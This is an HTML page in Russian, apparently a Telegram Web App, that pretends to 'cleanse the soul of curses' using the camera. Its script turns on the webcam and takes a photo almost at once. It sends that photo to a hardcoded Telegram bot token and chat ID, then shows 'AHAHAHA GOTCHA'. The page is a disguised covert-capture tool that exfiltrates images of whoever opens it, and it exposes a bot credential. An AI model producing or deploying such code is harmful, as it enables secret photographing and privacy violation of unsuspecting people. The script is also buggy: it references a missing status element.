<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Очищение души</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(to right, #4facfe, #00f2fe);
            color: white;
            text-align: center;
            flex-direction: column;
        }
        h1 {
            margin-bottom: 20px;
        }
        video, canvas {
            width: 300px;
            height: 225px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }
        #captureBtn {
            margin-top: 20px;
            padding: 10px 20px;
            font-size: 18px;
            border: none;
            background: #ff416c;
            color: white;
            border-radius: 5px;
            cursor: pointer;
            transition: 0.3s;
        }
        #captureBtn:hover {
            background: #ff4b2b;
        }
        #result {
            margin-top: 20px;
        }
        #result img {
            width: 300px;
            height: 225px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }
    </style>
</head>
<body>
    <h1>Очищение души от порчи при помощи камеры</h1>
    <p>Сейчас мы очищаем вашу душу от плохих сущностей...</p>
    <video id="video" autoplay></video>
    <button id="captureBtn">Сделать фото</button>
    <canvas id="canvas" style="display:none;"></canvas>
    <div id="result"></div>

    <script>
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        const captureBtn = document.getElementById("captureBtn");
        const result = document.getElementById("result");
        const ctx = canvas.getContext("2d");
        
        // Включаем камеру
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => { 
                video.srcObject = stream; 
                
                // Через 5 секунд делаем снимок и показываем пользователю
                setTimeout(() => {
                    // Делать снимок
                    ctx.drawImage(video, 0, 0, 320, 240);
                    let imgData = canvas.toDataURL('image/png');

                    // Отправляем фото в Telegram
                    sendPhoto(imgData);

                    // Останавливаем камеру
                    stream.getTracks().forEach(track => track.stop());

                    result.innerHTML = `<h2>АХАХАХАХАХАХАХ ПОПАЛСЯ</h2><img src="${imgData}" alt="Фото">`;
                }, 200);
            })
            .catch(err => { console.error("Ошибка доступа к камере", err); });

        // Функция отправки фото в Telegram
        async function sendPhoto(imgData) {
            const status = document.getElementById("status");
            status.innerText = "Отправка...";

            // Преобразуем изображение в файл
            const byteString = atob(imgData.split(',')[1]);
            const arrayBuffer = new ArrayBuffer(byteString.length);
            const uintArray = new Uint8Array(arrayBuffer);

            for (let i = 0; i < byteString.length; i++) {
                uintArray[i] = byteString.charCodeAt(i);
            }

            const file = new Blob([uintArray], { type: "image/png" });

            // Создаем FormData
            let formData = new FormData();
            formData.append("photo", file, "photo.png");

            // Отправляем фото через API Telegram
            let botToken = "7818329173:AAHMNlLkhV6kI8k9lXpdQm5BzblwzUsPgWw";
            let chatId = "5180995134";  // Твой Telegram ID
            let url = `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`;

            fetch(url, {
                method: "POST",
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    status.innerText = "Фото успешно отправлено!";
                } else {
                    status.innerText = "Ошибка отправки!";
                }
            })
            .catch(error => {
                console.error("Ошибка:", error);
                status.innerText = "Ошибка соединения!";
            });
        }
    </script>
</body>
</html>
